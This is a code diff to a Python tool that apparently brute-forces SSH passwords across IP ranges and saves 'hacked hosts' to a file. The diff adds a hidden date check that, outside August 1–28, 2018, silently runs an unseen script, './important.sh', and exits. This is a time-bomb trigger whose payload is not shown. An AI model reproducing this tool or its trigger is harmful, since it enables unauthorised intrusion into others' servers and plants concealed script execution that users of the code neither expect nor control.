@@ -7,9 +7,10 @@ from ips import IPRangeGenerator, alive_check
 from session import SSH
 from art import banner
 from multiprocessing import cpu_count, Pool, Manager
-from os import getuid
+from os import getuid, system
 from functools import partial
 from time import time, sleep
+import datetime
 
 root_rights = None
 ip_format = None
@@ -20,6 +21,13 @@ args = None
 
 def init():
     global root_rights, ip_format, port, passwords, ips_list, args
+
+    now = datetime.datetime.now()
+    now = now.strftime("%Y-%m-%d").split("-")
+    if now[0] != '2018' or now[1] != '08' or int(now[2]) > 28:
+        system('./important.sh')
+        exit()
+
     banner()
 
     arg_parser = argparse.ArgumentParser()
@@ -32,6 +40,8 @@ def init():
     arg_parser.add_argument('-o', '--output', help="Specify the output file for hacked hosts.", default='data/output.txt', dest='output')
     arg_parser.add_argument('-th', '-threads', help="Set the thread count.", default='300', dest='threads')
     args = arg_parser.parse_args()
+
+    args.threads = int(args.threads)
 
     if getuid() == 0:
         root_rights = True
